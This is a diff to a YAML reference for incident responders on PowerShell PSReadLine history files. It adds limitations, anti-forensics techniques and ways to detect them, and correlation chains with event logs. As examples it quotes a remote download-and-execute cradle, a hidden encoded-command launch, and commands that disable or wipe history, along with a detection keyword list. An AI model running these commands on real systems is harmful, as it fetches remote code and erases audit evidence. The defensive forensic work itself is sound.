@@ -52,6 +52,34 @@ version_differences:
   psreadline_module: "PSReadLine ships in-box from Windows 10 / PowerShell 5.x onward; on older systems it may be absent or installed separately, in which case no history file exists."
   powershell_7: "PowerShell 7 (pwsh) uses the same PSReadLine directory but may write a distinct host history file - glob all *_history.txt."
 
+# parsing_tools / limitations / anti_forensics / correlation_patterns sourced from
+# the operator's reference "DFIR: Advanced Incident Response and Threat Hunting
+# Training Guide" notebook (PSReadLine + PowerShell 4103/4104 corroboration material).
+parsing_tools:
+  - "No dedicated parser needed - it is flat UTF-8 text; read directly (e.g. Get-Content, strings, any text viewer). Read defensively for BOM / mixed encoding."
+  - "KAPE - collects *_history.txt across all user profiles during triage; glob the PSReadLine directory rather than hardcoding ConsoleHost_history.txt."
+  - "Plaso / log2timeline.py - ingests the file's filesystem mtime into a Super Timeline (note: file-level time only, NOT per-command)."
+  - "grep/ripgrep for high-signal token sweeps across collected history files (IEX, -enc, DownloadString, FromBase64String) - never hardcode case-specific IOCs."
+
+limitations:
+  - "No per-command timestamps - the file records WHAT was typed and in what append order, never WHEN; only the file mtime bounds the last line. Time must come from EVTX 4103/4104."
+  - "MaximumHistoryCount default ~4096 lines - older lines silently roll off the top; early-command absence may be rotation, not innocence (report the observed line count)."
+  - "Interactive-only - non-interactive activity (powershell.exe -Command, -EncodedCommand spawned by another process, scheduled-task/service runspaces, WinRM/remoting runspaces) never touches PSReadLine."
+  - "Low integrity - the file is plain text, attacker-editable and deletable by anyone with write access to the profile; line order and contents carry no tamper resistance. A too-clean or truncated history is itself a signal."
+  - "Per-host fragmentation - VS Code, ISE, and pwsh hosts each write their own *_history.txt; analyzing only ConsoleHost_history.txt misses commands typed in other hosts."
+
+anti_forensics:
+  techniques:
+    - "Disabling history capture mid-session via 'Set-PSReadLineOption -HistorySaveStyle SaveNothing' or 'Remove-Module -Name PSReadLine' - halts further appends so subsequent commands are not recorded."  # DFIR reference
+    - "Deleting or truncating ConsoleHost_history.txt outright (no integrity guarantee on the file)."
+    - "Selectively editing out individual incriminating lines, leaving a plausible but doctored history."
+    - "Running everything non-interactively (-Command / -EncodedCommand / remoting) so nothing ever lands in PSReadLine in the first place."
+  detection:
+    - "The evasion command itself is recorded BEFORE logging halts - because Set-PSReadLineOption/Remove-Module must be TYPED at the console, the disable command appears in the history as the final captured line, flagging the tamper attempt."  # DFIR reference
+    - "Cross-check against PowerShell Operational EVTX 4104 - script-block logging is independent of PSReadLine and (for suspicious blocks) is force-logged by Windows even when script-block logging is globally disabled, so commands missing from a doctored history may still appear in 4104."
+    - "Line-count vs mtime sanity check - an implausibly short history on a long-used profile, or a history whose last line predates known interactive activity, indicates truncation/editing."
+    - "Compare each host's *_history.txt - a wiped ConsoleHost history while an ISE/VS Code host history is intact exposes selective cleanup."
+
 corroborate_with:
   powershell_evtx_4104: "PowerShell Operational EID 4104 script-block logging records the actual executed script blocks WITH real timestamps - the authoritative cross-check that a command in history actually ran and when."
   prefetch: "POWERSHELL.EXE-*.pf (and pwsh.exe) Prefetch proves the PowerShell binary executed and supplies run timestamps."
@@ -75,6 +103,16 @@ corroboration_escalation:
       upgrades_to: "CONFIRMED / definitive interactive execution (~1.0)"
       rationale: "Process creation (4688) + execution proof (Prefetch) + the typed command (history) form a court-defensible interactive-execution stack."
   tiers: "1 source = observation (~0.70); 2 independent = probable (~0.85); 3+ with timestamp alignment = confirmed/definitive (~1.0)."
+
+correlation_patterns:
+  - name: "Download cradle to execution"
+    chain: "History line shows an in-memory download cradle (e.g. IEX (New-Object Net.WebClient).DownloadString('http://.../x.ps1')) -> EVTX 4104 deobfuscates and dates the executed script block -> $MFT/$UsnJrnl date any payload written to disk -> EVTX 4688 + Prefetch (POWERSHELL.EXE) confirm the process ran."  # DFIR reference
+  - name: "Encoded-command unmasking"
+    chain: "History shows 'powershell -w Hidden -nop -noni -exec bypass -Enc <base64>' -> EVTX 4104 auto-decodes the Base64 to reveal the true script -> EVTX 4103 module logging supplies pipeline output/variables -> proves intent and actual effect of an otherwise opaque command."  # DFIR reference
+  - name: "Self-incriminating evasion"
+    chain: "Final captured history line is 'Set-PSReadLineOption -HistorySaveStyle SaveNothing' or 'Remove-Module PSReadLine' -> treat as attacker cleanup -> pivot to EVTX 4104 (force-logged for suspicious blocks) for the commands run after history capture was disabled."  # DFIR reference
+  - name: "Interactive-vs-automated triage"
+    chain: "Command of interest present in PSReadLine history -> if also in 4104 with an interactive host -> typed at console; if 4104 shows -EncodedCommand from a service/task parent with NO history line -> non-interactive execution (different actor mechanism)."
 
 heuristics:
   - "Flag high-signal lines case-agnostically: -enc/-EncodedCommand, IEX/Invoke-Expression, DownloadString/DownloadFile, bitsadmin, certutil, FromBase64String, and long base64 runs - never hardcode case-specific IOCs."
